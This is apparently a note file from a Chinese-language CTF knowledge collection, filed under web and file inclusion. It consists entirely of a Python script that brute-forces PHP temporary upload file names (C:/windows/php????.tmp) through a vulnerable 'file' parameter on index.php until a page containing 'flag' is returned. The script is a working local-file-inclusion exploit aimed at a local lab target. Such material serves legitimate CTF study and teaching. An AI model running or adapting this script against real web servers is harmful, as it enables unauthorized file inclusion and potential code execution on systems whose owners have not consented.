# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/文件包含.md
# TITLE: 正文
# CATEGORY: web

#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import string

charset = string.digits + string.ascii_letters  # 最好是多发几个，然后只取数字和字母不然效率真的很低

host = "127.0.0.1"
port = 80
base_url = "http://%s:%d" % (host, port)


def brute_force_tmp_files():
    for i in charset:
        for j in charset:
            for k in charset:
                for l in charset:
                        filename = i + j + k + l
                        url = "%s/index.php?file=C:/windows/php%s" % (
                            base_url, filename)+".tmp"
                        print (url)
                        try:
                            response = requests.get(url)
                            if 'flag' in response.text:
                                print ("[+] Include success!")
                                return True
                        except Exception as e:
                            print (e)
    return False

def main():
    brute_force_tmp_files()

if __name__ == "__main__":
    main()
